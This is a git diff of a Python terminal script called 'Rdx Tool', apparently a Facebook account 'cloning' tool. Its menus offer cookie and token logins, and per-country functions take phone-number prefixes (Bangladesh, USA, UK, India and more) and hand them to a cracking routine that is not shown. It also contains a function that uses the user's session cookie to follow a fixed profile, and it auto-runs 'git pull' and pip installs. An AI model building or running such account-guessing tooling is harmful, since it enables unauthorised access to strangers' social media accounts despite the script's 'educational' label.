@@ -1,5 +1,7 @@
 # Facebook: RDX
 # Github: RDX-76
+from __future__ import absolute_import
+from __future__ import print_function
 import os,sys,time,json,random,re,string,platform,base64,uuid
 os.system("git pull")
 from bs4 import BeautifulSoup as sop
@@ -9,59 +11,67 @@ from datetime import date
 from datetime import datetime
 from time import sleep
 from time import sleep as waktu
+import array
+import requests
+import hashlib
+import threading
+import smtplib
+
 try:
-    import requests
-    from concurrent.futures import ThreadPoolExecutor as ThreadPool
-    import mechanize
-    from requests.exceptions import ConnectionError
+	import requests
+	from concurrent.futures import ThreadPoolExecutor as ThreadPool
+	import mechanize
+	from requests.exceptions import ConnectionError
 except ModuleNotFoundError:
-    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
-    os.system('pip install bs4')
+	os.system('pip install mechanize requests futures bs4==2 > /dev/null')
+	os.system('pip install bs4')
     
 
 def cek_apk(session,coki):
-    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
-    sop = BeautifulSoup(w,"html.parser")
-    x = sop.find("form",method="post")
-    game = [i.text for i in x.find_all("h3")]
-    if len(game)==0:
-        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
-    else:
-        print(f'\r[Done] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))
-        for i in range(len(game)):
-            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
-        #else:
-            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
-    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
-    sop = BeautifulSoup(w,"html.parser")
-    x = sop.find("form",method="post")
-    game = [i.text for i in x.find_all("h3")]
-    if len(game)==0:
-        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
-    else:
-        print(f'\r[Done] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))
-        for i in range(len(game)):
-            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
-        else:
-            print('')
+	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
+	sop = BeautifulSoup(w,"html.parser")
+	x = sop.find("form",method="post")
+	game = [i.text for i in x.find_all("h3")]
+	if len(game)==0:
+		print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
+	else:
+		print(f'\r[Done] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))
+		for i in range(len(game)):
+			print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
+		#else:
+			#print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
+	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
+	sop = BeautifulSoup(w,"html.parser")
+	x = sop.find("form",method="post")
+	game = [i.text for i in x.find_all("h3")]
+	if len(game)==0:
+		print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
+	else:
+		print(f'\r[Done] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))
+		for i in range(len(game)):
+			print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
+		else:
+			print('')
 
 def follow(self, session, coki):
-        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
-            'cookie': coki }, **('cookies',)).text, 'html.parser')
-        get = r.find('a', 'Ikuti', **('string',)).get('href')
-        session.get('https://mbasic.facebook.com' + str(get), {
-            'cookie': coki }, **('cookies',)).text
+		r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
+			'cookie': coki }, **('cookies',)).text, 'html.parser')
+		get = r.find('a', 'Ikuti', **('string',)).get('href')
+		session.get('https://mbasic.facebook.com' + str(get), {
+			'cookie': coki }, **('cookies',)).text
             
-def keluar():
-	print('Rdx ')
+def exit():
+	os.system('clear')
+	print('\x1b[1;96mI Hope You Enjoyed It')
+	jalan('\x1b[1;92mThanks For Using This Tool')
 	os.sys.exit()  
 
 class jalan:
-    def __init__(self, z):
-        for e in z + "\n":
-            sys.stdout.write(e)
-            sys.stdout.flush()
-            time.sleep(0.009)
+	def __init__(self, z):
+		for e in z + "\n":
+			sys.stdout.write(e)
+			sys.stdout.flush()
+			time.sleep(0.009)
             
 P = '\x1b[1;97m'
 M = '\x1b[1;91m'
@@ -93,14 +103,13 @@ ta = current.year
 bu = current.month
 ha = current.day
 today = date.today()
-os.system('xdg-open https://www.facebook.com/RDX.RDX-76/')
 logo =("""\033[0;92m
 \033[0;92m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
-\033[0;92m▇▇\x1b[1;97m             WellCome to Rdx Tool   	  .        \033[0;92m▇▇
-\033[0;92m▇▇\x1b[1;94m              👇Tool Using Tips👇          .        \033[0;92m▇▇
-\033[0;92m▇▇\x1b[1;97m              Tool Update EveryDay        .        \033[0;92m▇▇
-\033[0;92m▇▇\x1b[1;94m         Termux Data Clear EveryDay .        \033[0;92m▇▇
-\033[0;92m▇▇\x1b[1;97m           Facebook Id -- Rdx      		  .        \033[0;92m▇▇
+\033[0;92m▇▇\x1b[1;97m             WellCome to Rdx Tool   	  .        \x1b[0;92m▇▇
+\033[0;92m▇▇\x1b[1;94m              👇Tool Using Tips👇          .        \x1b[0;92m▇▇
+\033[0;92m▇▇\x1b[1;97m              Tool Update EveryDay        .        \x1b[0;92m▇▇
+\033[0;92m▇▇\x1b[1;94m         Termux Data Clear EveryDay .        \x1b[0;92m▇▇
+\033[0;92m▇▇\x1b[1;97m           Facebook Id -- Rdx      		  .        \x1b[0;92m▇▇
 \033[0;92m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
      
       
@@ -131,7 +140,6 @@ logo1 =("""
 \033[0;92m |  '--'.'|  |  \  : .'    \   
 \033[0;92m |  |\  \ |  '--'  //  .'.  \  
 \033[0;92m `--' '--'`-------''--'   '--' 
-\033[1;93m\033[1;92m?\033[1;93m? Facebook\033[1;94m?\033[1;95m?\033[1;93m  \033[1;96m?\033[1;93mtokenx \033[1;92m?\033[1;95m?
 \033[1;95m«-----------------\033[1;91mRdx\033[1;95m-----------------»""")
 logo54 =("""
 \033[0;92m•~?~ ??????¯??(???)??~?~?~ ??????¯??(???)??~?~?~ ??????¯??
@@ -10484,10 +10492,15 @@ else:
     tag = "AM"
 
 def Primex():
+	os.system('clear')
 	print(logo6)
-	print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m[1]\x1b[1;96m Approved & Premmium\x1b[1;91m[PAID]')
+	print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m[1]\x1b[1;92m Approved & Premmium\x1b[1;91m[PAID]')
 	time.sleep(0.05)
 	print("\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m[2]\x1b[1;93m Demo Version")
+	time.sleep(0.05)
+	print("\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m[3]\x1b[1;96m What Will You Get In The PREMIUM Version???")
+	time.sleep(0.05)
+	print("\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m[0]\x1b[1;91m Exit")
 	time.sleep(0.05)
 	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
 	print('\x1b[1;97m«-----------------\x1b[1;97mRdx-76\x1b[1;97m---------------»')
@@ -10500,9 +10513,13 @@ def part():
 		print('\x1b[1;91mFill in correctly')
 		Premium()
 	elif option =='1':
-		login()
+		Subscraption()
 	elif option =='2':
 		Rdx2x()
+	elif option =='3':
+		details()
+	elif option =='0':
+		exit()
 
 
 
@@ -10525,21 +10542,23 @@ def login():
     time.sleep(0.05)
     print('\x1b[1;93m\x1b[1;91mActivitie This Tool is for Educational Purpose')
     time.sleep(0.05)
-    print('\x1b[1;97m«-----------------\x1b[1;97mRdx-76\x1b[1;97m---------------»')
+    print('\x1b[1;97m«-----------------\x1b[1;92mRdx-76\x1b[1;97m---------------»')
     time.sleep(0.05)
-    print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m1.\x1b[1;96m Fast Cloning Without fb id \x1b[1;97m[New Update]')
+    print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;92m[1]\x1b[1;92m Fast Cloning Without fb id \x1b[1;91m[New Update]')
     time.sleep(0.05)
-    print("\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m2.\x1b[1;93m Login only new Facebook ID ")
+    print("\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;92m[2]\x1b[1;93m Login only new Facebook ID ")
     time.sleep(0.05)
-    print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m3.\x1b[1;95m Login  Using Token Update by Rdx')
+    print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;92m[3]\x1b[1;95m Login  Using Token Update by Rdx')
     time.sleep(0.05)
-    print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m4.\x1b[1;97m Get Access Token App Fb')
+    print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;92m[4]\x1b[1;97m Get Access Token App Fb')
     time.sleep(0.05)
-    print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m5.\x1b[1;94m Rdx   Serch On Youtube   ')
+    print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;92m[5]\x1b[1;92m Generate Strong Passwords Randomly ')
     time.sleep(0.05)
-    print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m6.\x1b[1;91mRdx  Serch On Youtube   ')
+    print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;92m[6]\x1b[1;94m Rdx   Serch On Facebook   ')
     time.sleep(0.05)
-    print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m0.\x1b[1;97m Exit             ')
+    print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;92m[7]\x1b[1;96m Rdx  Serch On Youtube   ')
+    time.sleep(0.05)
+    print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;92m[0]\x1b[1;91m Exit             ')
     pilih_login()
 	
 def pilih_login():
@@ -10557,16 +10576,18 @@ def pilih_login():
 		os.system('xdg-open https://m.apkpure.com/get-access-token/com.proit.thaison.getaccesstokenfacebook/download/1-APK?from=versions%2Fversion')
 		login()
 	elif peak =='5':
-		os.system('xdg-open https://www.youtube.com/channel/UCih_lYasMeHMbEHYVzduhug')
-		login()
+		genpassx()
 	elif peak =='6':
 		os.system('xdg-open https://www.youtube.com/channel/UCih_lYasMeHMbEHYVzduhug')
 		login()
+	elif peak =='7':
+		os.system('xdg-open https://www.youtube.com/channel/UCih_lYasMeHMbEHYVzduhug')
+		login()
 	elif peak =='0':
-		keluar()
+		exit()
 	else:
 		print('\x1b[1;97m[!] Wrong input')
-		keluar()
+		exit()
 		
 def Rdx1x():
 	os.system('clear')
@@ -10609,399 +10630,623 @@ def action():
 	elif rdx2x =="1":
 		print(logo53)
 		os.system("clear")
-		print(logo7)
-		print("\x1b[1;97m175,165,191, 192, 193, 194, 195, 017,019,013,014,016,170,180,190,150,015,130,140,018,196, 197, 198, 199")
-		try:
-			c = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
-			k="+880"
-			idlist = ('.txt')
-			for line in open(idlist,"r").readlines():
-				id.append(line.strip())
-		except IOError:
-			print("[!] File Not Found")
-			input("\n[ Back ]")
-			Rdx1x()
+		bd()
 	elif rdx2x =="2":
 		print(logo53)
 		os.system("clear")
-		print(logo8)
-		print("\x1b[1;97m555,786, 815, 315, 256, 401, 718, 917, 202, 701, 303, 703, 803, 999, 708")
-		try:
-			c = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
-			k="+1"
-			idlist = ('.txt')
-			for line in open(idlist,"r").readlines():
-				id.append(line.strip())
-		except IOError:
-			print("[!] File Not Found")
-			input("\n[ Back ]")
-			Rdx1x()
+		usa()
 	elif rdx2x =="3":
 		print(logo53)
 		os.system("clear")
-		print(logo9)
-		print("\x1b[1;97m715,785,765,725,745,735,737, 706, 748, 783, 739, 759, 790")
-		try:
-			c = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
-			k="+44"
-			idlist = ('.txt')
-			for line in open(idlist,"r").readlines():
-				id.append(line.strip())
-		except IOError:
-			print("[!] File Not Found")
-			input("\n[ Back ]")
-			Rdx1x()
+		uk()
 	elif rdx2x =="4":
 		print(logo53)
 		os.system("clear")
-		print(logo10)
-		print("\x1b[1;97m905,975,755,855,954, 897, 967, 937, 700, 727, 965, 786, 874, 856, 566, 590, 527, 568, 578")
-		try:
-			c = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
-			k="+91"
-			idlist = ('.txt')
-			for line in open(idlist,"r").readlines():
-				id.append(line.strip())
-		except IOError:
-			print ("[!] File Not Found")
-			input("\n[ Back ]")
-			Rdx1x()
+		india()
 	elif rdx2x =="5":
 		print(logo53)
 		os.system("clear")
-		print(logo11)
-		print("\x1b[1;97m127, 179, 117, 853, 318, 219, 834, 186, 479, 113")
-		try:
-			c = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
-			k="+55"
-			idlist = ('.txt')
-			for line in open(idlist,"r").readlines():
-				id.append(line.strip())
-		except IOError:
-			print("[!] File Not Found")
-			input("\n[ Back ]")
-			Rdx1x()
+		brazil()
 	elif rdx2x =="6":
 		print(logo53)
 		os.system("clear")
-		print(logo12)
-		print("\x1b[1;97m11, 12, 19, 16, 15, 13, 14, 18, 17")
-		try:
-			c = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
-			k="+81"
-			idlist = ('.txt')
-			for line in open(idlist,"r").readlines():
-				id.append(line.strip())
-		except IOError:
-			print("[!] File Not Found")
-			input("\n[ Back ]")
-			Rdx1x()
+		japan()
 	elif rdx2x =="7":
 		print(logo53)
 		os.system("clear")
-		print(logo13)
-		print("\x1b[1;97m1, 2, 3, 4, 5, 6, 7, 8, 9")
-		try:
-			c = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
-			k="+82"
-			idlist = ('.txt')
-			for line in open(idlist,"r").readlines():
-				id.append(line.strip())
-		except IOError:
-			print("[!] File Not Found")
-			input("\n[ Back ]")
-			Rdx1x()
+		korea()
 	elif rdx2x =="8":
 		print(logo53)
 		os.system("clear")
-		print(logo14)
-		print("\x1b[1;97m311,323,385,388, 390, 391, 371, 380, 368, 386, 384, 332, 344, 351, 328")
-		try:
-			c = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
-			k="+39"
-			idlist = ('.txt')
-			for line in open(idlist,"r").readlines():
-				id.append(line.strip())
-		except IOError:
-			print("[!] File Not Found")
-			input("\n[ Back ]")
-			Rdx1x()
+		italy()
 	elif rdx2x =="9":
 		print(logo53)
 		os.system("clear")
-		print(logo15)
-		print("\x1b[1;97m655,755,60, 76, 73, 64, 69, 77, 65, 61, 75, 68")
-		try:
-			c = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
-			k="+34"
-			idlist = ('.txt')
-			for line in open(idlist,"r").readlines():
-				id.append(line.strip())
-		except IOError:
-			print("[!] File Not Found")
-			input("\n[ Back ]")
-			Rdx1x()
+		spain()
 	elif rdx2x =="10":
 		print(logo53)
 		os.system("clear")
-		print(logo16)
-		print("\x1b[1;97m66, 69, 78, 79, 60, 72, 67, 53, 51")
-		try:
-			c = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
-			k="+48"
-			idlist = ('.txt')
-			for line in open(idlist,"r").readlines():
-				id.append(line.strip())
-		except IOError:
-			print("[!] File Not Found")
-			input("\n[ Back ]")
-			Rdx1x()
+		poland()
 	elif rdx2x =="11":
 		print(logo53)
 		os.system("clear")
-		print(logo17)
-		print("\x1b[1;97m01, ~to~~, 49")
-		try:
-			c = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
-			k="+923"
-			idlist = ('.txt')
-			for line in open(idlist,"r").readlines():
-				id.append(line.strip())
-		except IOError:
-			print("[!] File Not Found")
-			input("\n[ Back ]")
-			Rdx1x()
+		pak()
 	elif rdx2x =="12":
 		print(logo53)
 		os.system("clear")
-		print(logo18)
-		print("\x1b[1;97m81,83,85,84,89,")
-		try:
-			c = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
-			k="+880"
-			idlist = ('.txt')
-			for line in open(idlist,"r").readlines():
-				id.append(line.strip())
-		except IOError:
-			print("[!] File Not Found")
-			input("\n[ Back ]")
-			Rdx1x()
+		indonesia()
 	elif rdx2x =="13":
 		print(logo53)
 		os.system("clear")
-		print(logo19)
-		print("\x1b[1;97m(leave the first four digits and the last seven digits of any phone number in this country.Write the remaining digits here.69,693,698,694,695")
-		try:
-			c = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
-			k="+3069"
-			idlist = ('.txt')
-			for line in open(idlist,"r").readlines():
-				id.append(line.strip())
-		except IOError:
-			print("[!] File Not Found")
-			input("\n[ Back ]")
-			Rdx1x()
+		greece()
 	elif rdx2x =="14":
 		print(logo53)
 		os.system("clear")
-		print(logo20)
-		print("\x1b[1;97m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.455")
-		try:
-			c = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
-			k="+61"
-			idlist = ('.txt')
-			for line in open(idlist,"r").readlines():
-				id.append(line.strip())
-		except IOError:
-			print("[!] File Not Found")
-			input("\n[ Back ]")
-			Rdx1x()
+		australia()
 	elif rdx2x =="15":
 		print(logo53)
 		os.system("clear")
-		print(logo21)
-		print("\x1b[1;97m(leave the first one digits and the last seven digits of any phone number in this country.Write the remaining digits here.555,")
-		try:
-			c = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
-			k="+1"
-			idlist = ('.txt')
-			for line in open(idlist,"r").readlines():
-				id.append(line.strip())
-		except IOError:
-			print("[!] File Not Found")
-			input("\n[ Back ]")
-			Rdx1x()
+		canada()
 	elif rdx2x =="16":
 		print(logo53)
 		os.system("clear")
-		print(logo22)
-		print("\x1b[1;97m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.1355,1555,1855,")
-		try:
-			c = input(" \x1b[1;97mchoose code  : ")
-			k="+86"
-			idlist = ('.txt')
-			for line in open(idlist,"r").readlines():
-				id.append(line.strip())
-		except IOError:
-			print("[!] File Not Found")
-			input("\n[ Back ]")
-			Rdx1x()
+		china()
 	elif rdx2x =="17":
 		print(logo53)
 		os.system("clear")
-		print(logo23)
-		print("\x1b[1;97m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.2,3,4,5,6,7,8")
-		try:
-			c = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
-			k="+45"
-			idlist = ('.txt')
-			for line in open(idlist,"r").readlines():
-				id.append(line.strip())
-		except IOError:
-			print("[!] File Not Found")
-			input("\n[ Back ]")
-			Rdx1x()
+		denmark()
 	elif rdx2x =="18":
 		print(logo53)
 		os.system("clear")
-		print(logo24)
-		print("\x1b[1;97m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.65,70,73,74,76,77")
-		try:
-			c = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
-			k="+33"
-			idlist = ('.txt')
-			for line in open(idlist,"r").readlines():
-				id.append(line.strip())
-		except IOError:
-			print("[!] File Not Found")
-			input("\n[ Back ]")
-			Rdx1x()
+		france()
 	elif rdx2x =="19":
 		print(logo53)
 		os.system("clear")
-		print(logo25)
-		print("\x1b[1;97m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.151,152,153,155,157,159,160,162,179,163,174,163")
-		try:
-			c = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
-			k="+49"
-			idlist = ('.txt')
-			for line in open(idlist,"r").readlines():
-				id.append(line.strip())
-		except IOError:
-			print("[!] File Not Found")
-			input("\n[ Back ]")
-			Rdx1x()
+		germany()
 	elif rdx2x =="20":
 		print(logo53)
 		os.system("clear")
-		print(logo26)
-		print("\x1b[1;97m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.11,12,13,14,15,16,17,18,19")
-		try:
-			c = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
-			k="+60"
-			idlist = ('.txt')
-			for line in open(idlist,"r").readlines():
-				id.append(line.strip())
-		except IOError:
-			print("[!] File Not Found")
-			input("\n[ Back ]")
-			Rdx1x()
+		malaysia()
 	elif rdx2x =="21":
 		print(logo53)
 		os.system("clear")
-		print(logo27)
-		print("\x1b[1;97m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.71,72,73,74,75,76,77,78")
-		try:
-			c = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
-			k="+94"
-			idlist = ('.txt')
-			for line in open(idlist,"r").readlines():
-				id.append(line.strip())
-		except IOError:
-			print("[!] File Not Found")
-			input("\n[ Back ]")
-			Rdx1x()
+		sri()
 	elif rdx2x =="22":
 		print(logo53)
 		os.system("clear")
-		print(logo28)
-		print("\x1b[1;97m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.55,54,53,52,50")
-		try:
-			c = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
-			k="+90"
-			idlist = ('.txt')
-			for line in open(idlist,"r").readlines():
-				id.append(line.strip())
-		except IOError:
-			print("[!] File Not Found")
-			input("\n[ Back ]")
-			Rdx1x()
+		turkey()
 	elif rdx2x =="23":
 		print(logo53)
 		os.system("clear")
-		print(logo29)
-		print("\x1b[1;97m(leave the first tree digits and the last seven digits of any phone number in this country.Write the remaining digits here.50,55,58,54,56")
-		try:
-			c = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
-			k="+971"
-			idlist = ('.txt')
-			for line in open(idlist,"r").readlines():
-				id.append(line.strip())
-		except IOError:
-			print("[!] File Not Found")
-			input("\n[ Back ]")
-			Rdx1x()
+		uae()
 	elif rdx2x =="24":
 		print(logo53)
 		os.system("clear")
-		print (logo30)
-		print("\x1b[1;97m(leave the first three digits and the last seven digits of any phone number in this country.Write the remaining digits here.50,51,52,53,54,55,56,57,58,")
-		try:
-			c = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
-			k="+966"
-			idlist = ('.txt')
-			for line in open(idlist,"r").readlines():
-				id.append(line.strip())
-		except IOError:
-			print ("[!] File Not Found")
-			input("\n[ Back ]")
-			Rdx1x()
+		saudi()
 	elif rdx2x =="25":
 		print(logo53)
 		os.system("clear")
-		print(logo31)
-		print("\x1b[1;97m(leave the first three digits and the last seven digits of any phone number in this country.Write the remaining digits here. 52,55")
-		try:
-			c = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
-			k="+972"
-			idlist = ('.txt')
-			for line in open(idlist,"r").readlines():
-				id.append(line.strip())
-		except IOError:
-			print("[!] File Not Found")
-			input("\n[ Back ]")
-			Rdx1x()
+		israel()
 	elif rdx2x =="26":
 		print(logo53)
 		os.system("clear")
-		print(logo32)
-		print("\x1b[1;97m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.990,915,901,933,938,902")
-		try:
-			c = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
-			k="+98"
-			idlist = ('.txt')
-			for line in open(idlist,"r").readlines():
-				id.append(line.strip())
-		except IOError:
-			print("[!] File Not Found")
-			input("\n[ Back ]")
-			Rdx1x()
+		iran()
 	elif rdx2x =='0':
 		login()
 	else:
 		print('[!] Fill in correctly')
 		action()
 
+
+def bd():
+	print(logo7)
+	print("\x1b[1;97m0175,0165,0191, 0192, 0193, 0194, 0195, 017,019,013,014,016,170,180,190,150,015,130,140,018,0196, 0197, 0198, 0199")
+	try:
+		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+		k="+880"
+		os.system('clear')
+		print(logo53)
+		os.system('clear')
+		print(logo7)
+		main()
+	except IOError:
+		print("[!] File Not Found")
+		input("\n[ Back ]")
+		Rdx1x()
+
+def usa():
+	print(logo8)
+	print("\x1b[1;97m555,786, 815, 315, 256, 401, 718, 917, 202, 701, 303, 703, 803, 999, 708")
+	try:
+		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+		k="+1"
+		os.system('clear')
+		print(logo)
+		print(logo8)
+		main()
+	except IOError:
+		print("[!] File Not Found")
+		input("\n[ Back ]")
+		Rdx1x()
+
+def uk():
+	print(logo9)
+	print("\x1b[1;97m715,785,765,725,745,735,737, 706, 748, 783, 739, 759, 790")
+	try:
+		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+		k="+44"
+		os.system('clear')
+		print(logo)
+		print(logo9)
+		main()
+	except IOError:
+		print("[!] File Not Found")
+		input("\n[ Back ]")
+		Rdx1x()
+
+def india():
+	print(logo10)
+	print("\x1b[1;97m905,975,755,855,954, 897, 967, 937, 700, 727, 965, 786, 874, 856, 566, 590, 527, 568, 578")
+	try:
+		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+		k="+91"
+		os.system('clear')
+		print(logo)
+		print(logo10)
+		main()
+	except IOError:
+		print ("[!] File Not Found")
+		input("\n[ Back ]")
+		Rdx1x()
+
+def brazil():
+	print(logo11)
+	print("\x1b[1;97m127, 179, 117, 853, 318, 219, 834, 186, 479, 113")
+	try:
+		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+		k="+55"
+		os.system('clear')
+		print(logo)
+		print(logo11)
+		main()
+	except IOError:
+		print("[!] File Not Found")
+		input("\n[ Back ]")
+		Rdx1x()
+
+def japan():
+	print(logo12)
+	print("\x1b[1;97m11, 12, 19, 16, 15, 13, 14, 18, 17")
+	try:
+		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+		k="+81"
+		os.system('clear')
+		print(logo)
+		print(logo12)
+		main()
+	except IOError:
+		print("[!] File Not Found")
+		input("\n[ Back ]")
+		Rdx1x()
+
+def korea():
+	print(logo13)
+	print("\x1b[1;97m1, 2, 3, 4, 5, 6, 7, 8, 9")
+	try:
+		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+		k="+82"
+		os.system('clear')
+		print(logo)
+		print(logo13)
+		main()
+	except IOError:
+		print("[!] File Not Found")
+		input("\n[ Back ]")
+		Rdx1x()
+
+def italy():
+	print(logo14)
+	print("\x1b[1;97m311,323,385,388, 390, 391, 371, 380, 368, 386, 384, 332, 344, 351, 328")
+	try:
+		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+		k="+39"
+		os.system('clear')
+		print(logo)
+		print(logo14)
+		main()
+	except IOError:
+		print("[!] File Not Found")
+		input("\n[ Back ]")
+		Rdx1x()
+
+def spain():
+	print(logo15)
+	print("\x1b[1;97m655,755,60, 76, 73, 64, 69, 77, 65, 61, 75, 68")
+	try:
+		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+		k="+34"
+		os.system('clear')
+		print(logo)
+		print(logo15)
+		main()
+	except IOError:
+		print("[!] File Not Found")
+		input("\n[ Back ]")
+		Rdx1x()
+
+def poland():
+	print(logo16)
+	print("\x1b[1;97m66, 69, 78, 79, 60, 72, 67, 53, 51")
+	try:
+		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+		k="+48"
+		os.system('clear')
+		print(logo)
+		print(logo16)
+		main()
+	except IOError:
+		print("[!] File Not Found")
+		input("\n[ Back ]")
+		Rdx1x()
+
+def pak():
+	print(logo17)
+	print("\x1b[1;97m01, ~to~~, 49")
+	try:
+		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+		k="+923"
+		os.system('clear')
+		print(logo)
+		print(logo17)
+		main()
+	except IOError:
+		print("[!] File Not Found")
+		input("\n[ Back ]")
+		Rdx1x()
+
+def indonesia():
+	print(logo18)
+	print("\x1b[1;97m81,83,85,84,89,")
+	try:
+		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+		k="+880"
+		os.system('clear')
+		print(logo)
+		print(logo18)
+		main()
+	except IOError:
+		print("[!] File Not Found")
+		input("\n[ Back ]")
+		Rdx1x()
+
+def greece():
+	print(logo19)
+	print("\x1b[1;97m(leave the first four digits and the last seven digits of any phone number in this country.Write the remaining digits here.69,693,698,694,695")
+	try:
+		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+		k="+3069"
+		os.system('clear')
+		print(logo)
+		print(logo19)
+		main()
+	except IOError:
+		print("[!] File Not Found")
+		input("\n[ Back ]")
+		Rdx1x()
+
+def australia():
+	print(logo20)
+	print("\x1b[1;97m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.455")
+	try:
+		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+		k="+61"
+		os.system('clear')
+		print(logo)
+		print(logo20)
+		main()
+	except IOError:
+		print("[!] File Not Found")
+		input("\n[ Back ]")
+		Rdx1x()
+
+def canada():
+	print(logo21)
+	print("\x1b[1;97m(leave the first one digits and the last seven digits of any phone number in this country.Write the remaining digits here.555,")
+	try:
+		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+		k="+1"
